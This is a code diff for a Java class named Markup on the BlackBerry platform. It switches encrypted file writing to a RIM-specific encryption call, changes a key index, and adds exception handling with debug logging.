@@ -13,6 +13,8 @@ import java.util.Date;
 import java.util.Enumeration;
 
 import net.rim.device.api.crypto.CryptoException;
+import net.rim.device.api.crypto.CryptoTokenException;
+import net.rim.device.api.crypto.CryptoUnsupportedOperationException;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.config.Keys;
@@ -219,7 +221,7 @@ public class Markup {
 
             byte[] plain = null;
             try {
-                plain = encryption.decryptDataRim(encData, 4);
+                plain = encryption.decryptDataRim(encData, 0);
             } catch (CryptoException e) {
                 return null;
             }
@@ -284,12 +286,34 @@ public class Markup {
         fileRet.create();
 
         if (data != null) {
-            final byte[] encData = encryption.encryptData(data);
-            //#ifdef DBC
-            Check.asserts(encData.length >= data.length, "strange data len");
-            //#endif
-            //fileRet.write(data.length);
-            fileRet.append(encData);
+            byte[] encData;
+            try {
+                encData = encryption.encryptDataRim(data, 0);
+                //#ifdef DBC
+                Check.asserts(encData.length >= data.length, "strange data len");
+                //#endif
+                //fileRet.write(data.length);
+                fileRet.append(encData);
+            } catch (CryptoTokenException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                debug.error("writeMarkup");
+                //#endif
+                return false;
+            } catch (CryptoUnsupportedOperationException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                debug.error("writeMarkup");
+                //#endif
+                return false;
+            } catch (IOException e) {
+              //#ifdef DEBUG
+                debug.error(e);
+                debug.error("writeMarkup");
+                //#endif
+                return false;
+            }
+           
         }
 
         return true;
@@ -304,7 +328,7 @@ public class Markup {
             DataBuffer buffer = new DataBuffer(data, 0, data.length, true);
             long time = buffer.readLong();
             date = new Date(time);
-        } catch (IOException e) {
+        } catch (Exception e) {
             //#ifdef DEBUG
             debug.error(e);
             debug.error("readDate");
